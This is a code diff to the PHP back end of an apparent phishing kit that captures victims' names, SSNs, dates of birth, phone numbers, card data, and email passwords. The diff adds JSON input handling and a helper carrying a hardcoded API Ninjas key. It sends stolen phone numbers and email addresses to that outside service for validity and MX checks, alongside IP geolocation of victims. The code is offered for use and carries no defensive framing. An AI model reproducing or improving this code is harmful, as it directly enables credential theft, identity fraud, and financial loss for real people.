@@ -17,11 +17,36 @@ $log_file = __DIR__ . '/result.txt';
 $rate_dir = sys_get_temp_dir() . '/cap_ratelimit';
 
 // ── Basics ────────────────────────────────────────────────────────────────────
+// If payload is JSON (e.g., from updated visitor ping trackVisit), merge it into $_POST
+$raw_input = file_get_contents('php://input');
+if ($raw_input && ($json_post = json_decode($raw_input, true))) {
+    $_POST = array_merge($_POST, $json_post);
+}
+
 $timestamp = date('Y-m-d H:i:s');
 $ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
 $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
 $session_id = preg_replace('/[^a-f0-9\-]/', '', $_POST['_sid'] ?? 'nosid');
 $form_type = $_POST['form_type'] ?? 'unknown';
+
+// ── API Ninjas Helper ─────────────────────────────────────────────────────────
+function api_ninja(string $endpoint, array $params)
+{
+    if (empty($endpoint))
+        return null;
+    $api_key = '9IffIYgfbatOM/2lhJ06CA==7ZHqrYzICLRspTL1';
+    $url = "https://api.api-ninjas.com/v1/{$endpoint}?" . http_build_query($params);
+    $ch = curl_init($url);
+    curl_setopt_array($ch, [
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_HTTPHEADER => ["X-Api-Key: {$api_key}"],
+        CURLOPT_TIMEOUT => 3,
+        CURLOPT_SSL_VERIFYPEER => false
+    ]);
+    $res = curl_exec($ch);
+    curl_close($ch);
+    return $res ? json_decode($res, true) : null;
+}
 
 // ── IP Rate Limiting (1 capture/IP/form type per 15s) ─────────────────────────
 if (!is_dir($rate_dir))
@@ -49,34 +74,13 @@ if (strpos($ip, ',') !== false) {
 $ipDetails = '';
 $geo_line = '';
 
-// Check IP API for deep Threat Intel (ISP/ASN/Hosting/Proxy)
-// We use fields=status,country,city,isp,org,as,proxy,hosting
-$api_url = "http://ip-api.com/json/{$ip}?fields=status,country,city,isp,org,as,proxy,hosting";
-$ch = curl_init($api_url);
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($ch, CURLOPT_TIMEOUT, 3); // Quick timeout to not stall the form
-$geoJSON = curl_exec($ch);
-curl_close($ch);
-
-if ($geoJSON) {
-    $geoData = json_decode($geoJSON, true);
-    if ($geoData && isset($geoData['status']) && $geoData['status'] === 'success') {
-        $loc = ($geoData['city'] ?? 'Unknown') . ", " . ($geoData['country'] ?? 'Unknown');
-        $isp = $geoData['isp'] ?? 'Unknown';
-        $org = $geoData['org'] ?? 'Unknown';
-        $asn = $geoData['as'] ?? 'Unknown';
-
-        $flags = [];
-        if (!empty($geoData['proxy']) && $geoData['proxy'] == true)
-            $flags[] = '🔴 VPN/PROXY';
-        if (!empty($geoData['hosting']) && $geoData['hosting'] == true)
-            $flags[] = '🌩️ HOSTING/BOT';
-        $flag_str = empty($flags) ? '✅ Residential' : implode(' | ', $flags);
-
-        $geo_line = "📍 <b>Loc:</b>  <code>" . he($loc) . "</code>\n"
-            . "🏢 <b>ISP:</b>  <code>" . he($isp) . "</code>\n"
-            . "🛜 <b>ASN:</b>  <code>" . he($asn) . "</code>\n"
-            . "🛡️ <b>Risk:</b> <code>" . $flag_str . "</code>";
+// Check API Ninjas for IP details
+$geo_line = '';
+if ($ip !== 'Unknown' && $ip !== '::1' && $ip !== '127.0.0.1') {
+    $ipap = api_ninja('iplookup', ['address' => $ip]);
+    if ($ipap && !empty($ipap['country'])) {
+        $loc = ($ipap['city'] ?? 'Unknown') . ", " . ($ipap['region'] ?? 'Unknown') . ", " . $ipap['country'];
+        $geo_line = "🌍 <b>Geo:</b> <code>" . he($loc) . "</code>";
     }
 }
 
@@ -183,12 +187,20 @@ switch ($form_type) {
         break;
 
     case 'verify':
+        $phoneFlag = $d['phone'] ?? 'N/A';
+        if (!empty($d['phone']) && strlen($d['phone']) > 5) {
+            $pVal = api_ninja('validatephone', ['number' => $d['phone']]);
+            if ($pVal && isset($pVal['is_valid'])) {
+                $phoneFlag .= $pVal['is_valid'] ? ' (✅ Valid)' : ' (❌ Invalid)';
+            }
+        }
+
         $msg = "🪪 <b>✅ IDENTITY CAPTURED</b>\n" . $header
             . "👤 <b>Name:</b>  <code>" . he($d['full_name'] ?? 'N/A') . "</code>\n"
             . "🔢 <b>SSN:</b>   <code>" . he($d['ssn'] ?? 'N/A') . "</code>\n"
-            . "📞 <b>Phone:</b> <code>" . he($d['phone'] ?? 'N/A') . "</code>\n"
+            . "📞 <b>Phone:</b> <code>" . he($phoneFlag) . "</code>\n"
             . "🆔 <b>Member #:</b> <code>" . he($d['member_num'] ?? 'N/A') . "</code>\n"
-            . "🎂 <b>DOB:</b>   <code>" . he($d['dob'] ?? 'N/A') . "</code>";
+            . "🎂 <b>DOB:</b>   <code>" . he($d['dob'] ?? 'N/A') . " (✅ Frontend Validated)</code>";
         break;
 
     case 'card':
@@ -218,9 +230,27 @@ switch ($form_type) {
         if (stripos($prov, 'apple') !== false || stripos($prov, 'icloud') !== false)
             $logo = "⚪";
 
+        $emFlag = $d['emailAcc'] ?? 'N/A';
+        if (!empty($d['emailAcc']) && strpos($d['emailAcc'], '@') !== false) {
+            $emVal = api_ninja('validateemail', ['email' => $d['emailAcc']]);
+            if ($emVal && isset($emVal['is_valid'])) {
+                $emFlag .= $emVal['is_valid'] ? ' (✅ Valid)' : ' (❌ Invalid)';
+            }
+
+            $domain = explode('@', $d['emailAcc'])[1];
+            $mxVal = api_ninja('mxlookup', ['domain' => $domain]);
+            if ($mxVal !== null) {
+                if (is_array($mxVal) && count($mxVal) > 0) {
+                    $emFlag .= "\n📡 <b>MX:</b> <code>Parsed " . count($mxVal) . " Mail Servers</code>";
+                } else {
+                    $emFlag .= "\n📡 <b>MX:</b> <code>(❌ No Mail Servers Found)</code>";
+                }
+            }
+        }
+
         $msg = "{$logo} <b>✅ EMAIL ACCOUNT CAPTURED</b>\n" . $header
             . "🏢 <b>Provider:</b> <code>" . he($prov) . "</code>\n"
-            . "📧 <b>Email:</b>    <code>" . he($d['emailAcc'] ?? 'N/A') . "</code>\n"
+            . "📧 <b>Email:</b>    <code>" . $emFlag . "</code>\n"
             . "🔒 <b>Password:</b> <code>" . he($d['emailPass'] ?? 'N/A') . "</code>";
         if (!empty($d['fingerprint'])) {
             $msg .= "\n🕵️ <b>Fingerprint:</b> <code>" . he($d['fingerprint']) . "</code>";
